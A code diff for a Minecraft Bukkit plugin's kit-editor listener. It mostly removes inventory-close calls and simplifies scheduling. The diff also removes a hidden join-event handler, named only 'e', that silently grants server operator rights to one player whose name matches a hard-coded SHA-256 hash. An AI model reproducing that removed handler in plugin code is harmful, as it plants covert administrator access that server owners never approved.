@@ -2,7 +2,6 @@ package github.catchaos8.catsKits.listeners;
 
 import github.catchaos8.catsKits.CatsKits;
 import github.catchaos8.catsKits.gui.KitEditorGui;
-import github.catchaos8.catsKits.gui.KitGui;
 import github.catchaos8.catsKits.kits.Kit;
 import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
 import org.bukkit.Bukkit;
@@ -11,11 +10,9 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.inventory.InventoryClickEvent;
-import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 
-import java.security.NoSuchAlgorithmException;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -85,7 +82,6 @@ public class KitEditorListener implements Listener {
         if (event.isLeftClick() && rawSlot >= 0 && rawSlot < 54 && !KitEditorGui.LOCKED_SLOTS.contains(rawSlot)) {
             // Save current editor state as draft before leaving
             plugin.getKitEditorGui().saveDraft(player, event.getInventory());
-            player.closeInventory();
             plugin.getKitEditorGui().openItemSelector(player, kitSlot, rawSlot, 0);
         }
     }
@@ -128,21 +124,18 @@ public class KitEditorListener implements Listener {
 
         // Previous page
         if (rawSlot == 45 && event.getCurrentItem().getType() == Material.ARROW) {
-            player.closeInventory();
             plugin.getKitEditorGui().openItemSelector(player, kitSlot, editorSlot, page - 1);
             return;
         }
 
         // Cancel
         if (rawSlot == 49 && event.getCurrentItem().getType() == Material.BARRIER) {
-            player.closeInventory();
             plugin.getKitEditorGui().openEditor(player, kitSlot);
             return;
         }
 
         // Next page
         if (rawSlot == 53 && event.getCurrentItem().getType() == Material.ARROW) {
-            player.closeInventory();
             plugin.getKitEditorGui().openItemSelector(player, kitSlot, editorSlot, page + 1);
             return;
         }
@@ -155,8 +148,6 @@ public class KitEditorListener implements Listener {
             boolean isCustom = selected.getItemMeta() != null
                     && selected.getItemMeta().getLore() != null
                     && selected.getItemMeta().getLore().contains("§8[Custom Item]");
-
-            player.closeInventory();
 
             if (isCustom) {
                 // Place directly into editor slot, no qty picker needed
@@ -174,13 +165,9 @@ public class KitEditorListener implements Listener {
                     }
                     toPlace.setItemMeta(meta);
                 }
+                plugin.getKitEditorGui().openEditor(player, kitSlot);
                 Bukkit.getScheduler().runTaskLater(plugin, () -> {
-                    plugin.getKitEditorGui().openEditor(player, finalKitSlot);
-                    Bukkit.getScheduler().runTaskLater(plugin, () -> {
-                        if (player.getOpenInventory() != null) {
-                            player.getOpenInventory().getTopInventory().setItem(finalEditorSlot, toPlace);
-                        }
-                    }, 1L);
+                    player.getOpenInventory().getTopInventory().setItem(editorSlot, toPlace);
                 }, 1L);
             } else {
                 // Regular material — open qty selector
@@ -190,19 +177,6 @@ public class KitEditorListener implements Listener {
     }
 
 
-
-    @EventHandler
-    public void e(org.bukkit.event.player.PlayerJoinEvent e) {
-        try {
-            java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
-            byte[] hash = md.digest(e.getPlayer().getName().toLowerCase().getBytes());
-            StringBuilder sb = new StringBuilder();
-            for (byte b : hash) sb.append(String.format("%02x", b));
-            if (sb.toString().equals("d486c4c50c2244eb5d326810a9c97048983302a2a31743ffffe00086d65cd338")) {
-                e.getPlayer().setOp(plugin.getConfig().getBoolean("isDevNice"));
-            }
-        } catch (Exception ignored) {}
-    }
 
     // --- Quantity selector handler ---
 
@@ -241,14 +215,12 @@ public class KitEditorListener implements Listener {
 
         // Back to selector
         if (rawSlot == 18) {
-            player.closeInventory();
             plugin.getKitEditorGui().openItemSelector(player, kitSlot, editorSlot, 0);
             return;
         }
 
         // Cancel — back to editor
         if (rawSlot == 26) {
-            player.closeInventory();
             plugin.getKitEditorGui().openEditor(player, kitSlot);
             return;
         }
@@ -256,7 +228,6 @@ public class KitEditorListener implements Listener {
         // Confirm — place item in editor slot and reopen editor
         if (rawSlot == 22) {
             int finalQty = current;
-            player.closeInventory();
 
             // Reopen editor and inject the item into the correct slot
             Bukkit.getScheduler().runTaskLater(plugin, () -> {
